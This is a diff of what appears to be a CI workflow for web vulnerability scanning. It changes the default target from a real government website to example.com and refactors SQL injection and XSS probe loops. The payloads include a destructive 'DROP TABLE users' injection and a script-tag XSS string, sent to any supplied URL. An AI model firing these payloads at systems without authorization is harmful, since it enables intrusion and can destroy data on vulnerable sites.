@@ -11,7 +11,7 @@ on:
       target_url:
         description: "Target website URL (e.g. https://example.com)"
         required: true
-        default: "https://bekasikota.go.id"
+        default: "https://example.com"
       scan_depth:
         description: "Scan depth: quick | full"
         required: false
@@ -295,21 +295,33 @@ jobs:
           {
             echo "=== SQL Injection basic payloads ==="
             URL=$TARGET_URL
-            for payload in "'" "'OR'1'='1" "'--" "1 OR 1=1" "1; DROP TABLE users--"; do
-              encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
-              result=$(curl -s --max-time 8 "$URL/?id=$encoded" -o /dev/null -w "%{http_code}" 2>&1)
-              echo "Payload: $payload -> HTTP $result"
+
+            # Gunakan --data-urlencode agar curl handle encoding, hindari quoting issue
+            PAYLOADS="QUOTE ORCLAUSE COMMENT OROR DROPTABLE"
+            for p in $PAYLOADS; do
+              case $p in
+                QUOTE)     PAYLOAD="'"           ;;
+                ORCLAUSE)  PAYLOAD="' OR '1'='1" ;;
+                COMMENT)   PAYLOAD="'--"         ;;
+                OROR)      PAYLOAD="1 OR 1=1"    ;;
+                DROPTABLE) PAYLOAD="1; DROP TABLE users--" ;;
+              esac
+              result=$(curl -s --max-time 8 -o /dev/null -w "%{http_code}" \
+                --get --data-urlencode "id=$PAYLOAD" "$URL" 2>&1)
+              echo "Payload: $PAYLOAD -> HTTP $result"
             done
 
             echo ""
             echo "=== Error-based SQLi on common params ==="
             for param in id user name search q page; do
-              result=$(curl -s --max-time 8 "$URL/?$param='" 2>&1 | grep -iE "sql|mysql|syntax|ora-|pg_" | head -3)
+              result=$(curl -s --max-time 8 \
+                --get --data-urlencode "$param='" "$URL" 2>&1 \
+                | grep -iE "sql|mysql|syntax|ora-|pg_" | head -3)
               if [ -n "$result" ]; then
                 echo "POTENTIAL SQLi on ?$param: $result"
               fi
             done
-          } > $REPORT_DIR/sqli-test.txt 2>&1
+          } > $REPORT_DIR/sqli-test.txt 2>&1 || true
 
       - name: Basic XSS test
         run: |
@@ -317,9 +329,9 @@ jobs:
             echo "=== XSS basic reflection test ==="
             XSS_PAYLOAD='<script>alert(1)</script>'
             for param in q search name id; do
-              encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$XSS_PAYLOAD'))")
-              response=$(curl -s --max-time 8 "$TARGET_URL/?$param=$encoded" 2>&1)
-              if echo "$response" | grep -q "$XSS_PAYLOAD"; then
+              response=$(curl -s --max-time 8 \
+                --get --data-urlencode "$param=$XSS_PAYLOAD" "$TARGET_URL" 2>&1)
+              if echo "$response" | grep -qF "$XSS_PAYLOAD"; then
                 echo "REFLECTED XSS found on param: $param"
               else
                 echo "No reflection on: $param"
